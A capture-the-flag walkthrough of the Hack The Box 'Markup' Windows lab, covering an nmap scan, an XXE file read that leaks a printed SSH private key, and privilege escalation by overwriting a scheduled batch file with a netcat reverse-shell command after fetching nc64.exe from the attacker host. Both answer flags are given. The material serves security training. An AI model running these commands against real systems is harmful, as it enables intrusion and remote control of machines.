# Markup (Windows)

## Machine Details 

- **CTF:** Hack The Box
- **Category:** Tier 2

## Solution

#### 1. What version of Apache is running on the target's port 80?

```sh
$ nmap -A -T4 10.129.184.139
Starting Nmap 7.94 ( https://nmap.org ) at 2024-03-04 10:47 CET
Nmap scan report for 10.129.184.139
Host is up (0.033s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9f:a0:f7:8c:c6:e2:a4:bd:71:87:68:82:3e:5d:b7:9f (RSA)
|   256 90:7d:96:a9:6e:9e:4d:40:94:e7:bb:55:eb:b3:0b:97 (ECDSA)
|_  256 f9:10:eb:76:d4:6d:4f:3e:17:f3:93:d6:0b:8c:4b:81 (ED25519)
80/tcp  open  http     Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-title: MegaShopping
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
443/tcp open  ssl/http Apache httpd 2.4.41 ((Win64) OpenSSL/1.1.1c PHP/7.2.28)
|_http-server-header: Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.2.28
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: MegaShopping
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94.12 seconds
```

> 2.4.41

#### 2. What username:password combination logs in successfully?

> admin:password

#### 3. What is the word at the top of the page that accepts user input?

> order

#### 4. What XML version is used on the target?

![xml](./xml.jpg)

> 1.0

#### 5. What does the XXE / XEE attack acronym stand for?

> XML external entity

#### 6. What username can we find on the webpage's HTML code?

```html
<title>Goods & Services</title>
<!-- Modified by Daniel : UI-Fix-9092-->
```

> Daniel

#### 7. What is the file located in the Log-Management folder on the target?

[XXE Attacks](https://book.hacktricks.xyz/pentesting-web/xxe-xee-xml-external-entity)

We can cause `XXE` attack with:

![work](./work.jpg)

Let's get Daniel's private key:

![rsa](./rsa.jpg)

Save this private key local:

```sh
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Then give to it right permissions:

```sh
$ chmod 400 id_rsa   
```

And finally connect with ssh using it:

```sh
$ ssh -i id_rsa daniel@10.129.184.139



Microsoft Windows [Version 10.0.17763.107]                                       
(c) 2018 Microsoft Corporation. All rights reserved.                             
                                                                                 
daniel@MARKUP C:\Users\daniel>
```

Next, we need to escalate our priveleges:

```sh
daniel@MARKUP C:\Users\daniel\Desktop>cd C:\                                     
                                                                                 
daniel@MARKUP C:\>dir                                                            
 Volume in drive C has no label.                                                 
 Volume Serial Number is BA76-B4E3                                               
                                                                                 
 Directory of C:\                                                                
                                                                                 
03/12/2020  02:56 AM    <DIR>          Log-Management                            
09/14/2018  11:12 PM    <DIR>          PerfLogs                                  
07/28/2021  01:01 AM    <DIR>          Program Files                             
09/14/2018  11:21 PM    <DIR>          Program Files (x86)                       
07/28/2021  02:38 AM                 0 Recovery.txt                              
03/05/2020  04:40 AM    <DIR>          Users                                     
07/28/2021  01:16 AM    <DIR>          Windows                                   
03/05/2020  09:15 AM    <DIR>          xampp                                     
               1 File(s)              0 bytes                                    
               7 Dir(s)   7,367,290,880 bytes free 
```

Let's see what's inside `Log-Management` directory:

```sh
daniel@MARKUP C:\>cd Log-Management                                              
                                                                                 
daniel@MARKUP C:\Log-Management>dir                                              
 Volume in drive C has no label.                                                 
 Volume Serial Number is BA76-B4E3                                               
                                                                                 
 Directory of C:\Log-Management                                                  
                                                                                 
03/12/2020  02:56 AM    <DIR>          .                                         
03/12/2020  02:56 AM    <DIR>          ..                                        
03/06/2020  01:42 AM               346 job.bat                                   
               1 File(s)            346 bytes                                    
               2 Dir(s)   7,368,298,496 bytes free
```

> job.bat

#### 8.What executable is mentioned in the file mentioned before?

```sh
daniel@MARKUP C:\Log-Management>type job.bat                                     
@echo off                                                                        
FOR /F "tokens=1,2*" %%V IN ('bcdedit') DO SET adminTest=%%V                     
IF (%adminTest%)==(Access) goto noAdmin                                          
for /F "tokens=*" %%G in ('wevtutil.exe el') DO (call :do_clear "%%G")           
echo.                                                                            
echo Event Logs have been cleared!                                               
goto theEnd                                                                      
:do_clear                                                                        
wevtutil.exe cl %1                                                               
goto :eof                                                                        
:noAdmin                                                                         
echo You must run this script as an Administrator!                               
:theEnd                                                                          
exit 
```

> wevtutil.exe

#### Submit user flag

```sh
daniel@MARKUP C:\Users\daniel\Desktop>type user.txt                              
032d2fc8952a8c24e39c8f0ee9918ef7 
```

#### Submit root flag

```sh
daniel@MARKUP C:\Log-Management>icacls job.bat                                   
job.bat BUILTIN\Users:(F)                                                        
        NT AUTHORITY\SYSTEM:(I)(F)                                               
        BUILTIN\Administrators:(I)(F)                                            
        BUILTIN\Users:(I)(RX)                                                    
                                                                                 
Successfully processed 1 files; Failed processing 0 files
```

We have full access to the file `BUILTIN\Users:(F)`. So we can transwer `nc64.exe` file and the override `job.bat`. First we start python server in the directory, where `nc64.exe` is located:

```sh
python3 -m http.server 80 
```

And then get it from our shell:

```sh
daniel@MARKUP C:\Log-Management>powershell                                       
Windows PowerShell                                                               
Copyright (C) Microsoft Corporation. All rights reserved.                        
                                                                                 
PS C:\Log-Management> wget http://10.10.16.15:80/nc64.exe -outfile nc64.exe
```

Since we have full control over the `job.bat` script, we will modify it's content by running the following command: 

```sh
daniel@MARKUP C:\Log-Management>echo C:\Log-Management\nc64.exe -e cmd.exe 10.10.16.15 9001 > C:\Log-Management\job.bat 
```

We turn on the netcat listener and wait for the script to execute:

```sh
$ nc -l 9001
```

```sh
$ nc -l 9001
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
f574a3e7650cebd8c39784299cb570f8
```

## Final Flag

> `user`: 032d2fc8952a8c24e39c8f0ee9918ef7
> `root`: f574a3e7650cebd8c39784299cb570f8

*Created by [bu19akov](https://github.com/bu19akov)*